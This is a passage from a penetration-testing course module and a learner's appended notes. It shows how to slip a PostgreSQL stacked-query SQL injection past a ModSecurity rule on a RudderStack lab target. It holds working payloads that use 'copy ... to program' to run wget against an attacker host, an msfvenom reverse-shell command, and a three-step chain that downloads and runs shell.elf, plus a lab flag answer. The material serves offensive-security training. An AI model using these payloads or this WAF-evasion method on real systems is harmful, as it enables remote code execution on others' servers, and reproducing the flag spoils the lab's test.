    setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
Listing 19 - SecRule definition excerpt for SQL Authentication bypass (split query)

We won't cover every detail of the syntax right now, but let's review the important parts.

The rule starts with the SecRule directive. After this directive, the rule defines a series of variables using a pipe (|) character between them. These define which parts of a request the WAF engine should inspect when applying this rule. The rule then defines an operator.

In this case, it uses a string that starts with "@rx" to denote a regular expression. The WAF engine will use this regex when it inspects a request. Although the regular expression in this rule may seem complex, it's essentially checking for a closing quote followed by a semicolon. The comments on this rule aren't entirely accurate with regard to why attackers use semicolons. The example payload we've been working with uses a semicolon to create stacked queries. PostgreSQL, MySQL, and Microsoft SQL Server will execute multiple SQL statements if passed a single string of semicolon-separated queries.

In the next section, we'll update our attack payload to bypass this regular expression.

12.3.5. Bypassing the WAF
Since the regular expression checks for a single quote followed by a semicolon, we need to update our payload. We don't care about the SQL statement we're injecting into, so we can modify that part of our payload in any number of ways.

We could add a number comparison after the single quote and before the semicolon. This would separate the single quote and semicolon. The exact value we use before the semicolon doesn't matter as long as it's valid SQL syntax. The outcome of the first SQL statement does not impact the outcome of the stacked or secondary SQL statement, as long as it does not generate a syntax error.

We'll use the following JSON body:

{ "source_id":"' or 1=2; copy (select 'a') to program 'wget -q http://192.168.48.3:9000/it_will_bypass' -- - ", "task_run_id":"1"}
Listing 20 - Updated payload

We can use an online tool like regex101 to test if the rule's regular expression matches our payload. When testing the regular expression, we don't need to include "@rx" since that is part of the SecRule definition, not the regular expression.

Figure 21: Using regex101 to check our payloads
Figure 21: Using regex101 to check our payloads
Based on the output from regex101, our payload should not be caught by the regular expression. There might be additional WAF rules that we aren't aware of, but let's try sending our updated payload. We'll need to start an HTTP server if we don't already have one running.

Figure 22: Repeater with 500 Internal Server Error response
Figure 22: Repeater with 500 Internal Server Error response
We received an error from the server, but the WAF did not block our request. Let's check our HTTP server.

kali@kali:~$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
192.168.120.144 - - [29/Feb/2024 15:44:44] code 404, message File not found
192.168.120.144 - - [29/Feb/2024 15:44:44] "GET /it_will_bypass HTTP/1.1" 404 -
Listing 21 - Python HTTP server logs

Excellent. We received a request from the server, indicating our payload evaded the WAF rules. While WAFs play an important role in the concept of defense in depth, they cannot prevent every single attack. Common WAF rules are generalized to work in many different contexts. These same generalities are what allow us to evade the rules by modifying our attack payloads.

Resources
Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

RudderStack - WAF Bypass	
192.168.184.144
Labs
Using the RudderStack - WAF Bypass VM, access the vulnerable endpoint on port 80, exploit the SQL injection vulnerability, and get a reverse shell. The flag is located at /flag.txt.
Answer
OS{7f7d76340a1a5b9661662e82bea04283}
12.4. Wrapping Up
In this Learning Module, we performed source code analysis to discover API endpoints and used manual testing to determine which were unauthenticated. After we identified an endpoint, we determined how to structure our request and found a SQL injection vulnerability. We also examined the role web application firewalls play in defending web applications and how their rules may be too generalized to mitigate every single vulnerability.


For getting reverse shell:

We generated shell.elf using msfvenom.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST="192.168.45.204" LPORT=8888 -f elf > shell.elf

```

We hosted the exploit on kali. Downloaded the exploit. Made it executable and executed it.

```
{ "source_id":"' or 1=2; copy (select 'a') to program 'wget -q http://192.168.45.204:8000/shell.elf' -- - ", "task_run_id":"1"}

{ "source_id":"' or 1=2; copy (select 'a') to program 'chmod +x shell.elf' -- - ", "task_run_id":"1"}

{ "source_id":"' or 1=2; copy (select 'a') to program './shell.elf' -- - ", "task_run_id":"1"}
```
